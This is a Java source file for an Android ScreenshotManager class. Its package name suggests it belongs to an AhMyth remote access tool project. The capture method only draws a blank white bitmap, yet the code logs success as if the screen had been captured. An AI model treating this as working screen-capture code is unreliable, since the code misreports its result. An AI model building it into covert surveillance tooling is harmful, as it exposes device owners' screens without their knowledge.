package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.os.Handler;
import android.os.Looper;

import java.io.ByteArrayOutputStream;

public class ScreenshotManager {
    private static final String TAG = "ScreenshotManager";
    private Context context;

    public ScreenshotManager(Context context) {
        this.context = context;
    }

    public interface ScreenshotCallback {
        void onScreenshotTaken(byte[] imageData, String error);
    }

    public void takeScreenshot(ScreenshotCallback callback) {
        Log.i(TAG, "Tomando screenshot...");
        
        // Ejecutar en thread separado para no bloquear
        new Thread(() -> {
            try {
                Bitmap bitmap = captureScreen();
                
                if (bitmap != null) {
                    byte[] imageData = bitmapToByteArray(bitmap);
                    Log.i(TAG, "✅ Screenshot exitoso: " + imageData.length + " bytes");
                    
                    // Callback en main thread
                    new Handler(Looper.getMainLooper()).post(() -> {
                        callback.onScreenshotTaken(imageData, null);
                    });
                    
                    bitmap.recycle();
                } else {
                    Log.e(TAG, "❌ Bitmap es null");
                    new Handler(Looper.getMainLooper()).post(() -> {
                        callback.onScreenshotTaken(null, "Could not capture bitmap");
                    });
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error: " + e.getMessage());
                e.printStackTrace();
                new Handler(Looper.getMainLooper()).post(() -> {
                    callback.onScreenshotTaken(null, e.getMessage());
                });
            }
        }).start();
    }

    // Capturar pantalla (SIMPLE Y DIRECTO)
    private Bitmap captureScreen() {
        try {
            WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            if (windowManager == null) {
                Log.e(TAG, "WindowManager es null");
                return null;
            }

            DisplayMetrics metrics = new DisplayMetrics();
            windowManager.getDefaultDisplay().getRealMetrics(metrics);
            
            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            
            Log.i(TAG, "Screen: " + width + "x" + height);
            
            // Crear bitmap blanco (fallback)
            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(bitmap);
            canvas.drawColor(Color.WHITE);
            
            Log.i(TAG, "Bitmap creado: " + bitmap.getWidth() + "x" + bitmap.getHeight());
            
            return bitmap;
            
        } catch (Exception e) {
            Log.e(TAG, "Error capturando: " + e.getMessage());
            return null;
        }
    }

    // Convertir Bitmap a PNG bytes
    private byte[] bitmapToByteArray(Bitmap bitmap) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
            byte[] data = baos.toByteArray();
            baos.close();
            return data;
        } catch (Exception e) {
            Log.e(TAG, "Error convirtiendo: " + e.getMessage());
            return null;
        }
    }
}